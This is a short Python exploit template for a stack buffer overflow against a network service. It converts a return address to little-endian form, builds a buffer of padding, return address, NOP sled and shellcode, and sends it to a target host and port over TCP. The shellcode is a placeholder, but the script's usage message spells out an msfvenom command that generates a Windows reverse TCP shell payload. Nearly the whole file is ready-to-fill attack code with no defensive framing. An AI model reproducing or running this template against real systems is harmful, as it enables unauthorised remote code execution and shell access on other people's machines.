#!/usr/bin/python

import socket
import time
import sys

shellcode = (
"place shellcode here"
)

if len(sys.argv) == 2:

    ret = sys.argv[1]
    ret = ret.lower()
    address = ""
    for i in range(len(ret)-1,-1,-2):
        address += "\\x" + ret[i-1] + ret[i]
    print(address)
    exit(0)

elif len(sys.argv) != 4:
    print("usage: \"python exploit.py [target] [port] [eip]\"")
    print("usage: note that the inputBuffer's order may need to change based on targeted location!")
    exit(0)


target = sys.argv[1]
port = int(sys.argv[2])
eip = int(sys.argv[3])
ret = "change me!"

nop = 32

if ret == "change me!":
    print("you need to change \"ret\" to the output of \"./exploit.py [return address]\"")
    exit(0)

if shellcode == ("place shellcode here"):
    print("usage: need to add shellcode!!")
    print("usage: to do this, run: \"msfvenom -p windows/shell_reverse_tcp LHOST=[lhost] LPORT=[lport] EXITFUNC=thread -b [\\x00] -f c > exploit_shellcode")
    exit(0)

inputBuffer = "A" * eip + ret + "\x90" * nop + shellcode
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((target,port))
print("sending buffer")
s.send(inputBuffer)
s.close()
exit(0)



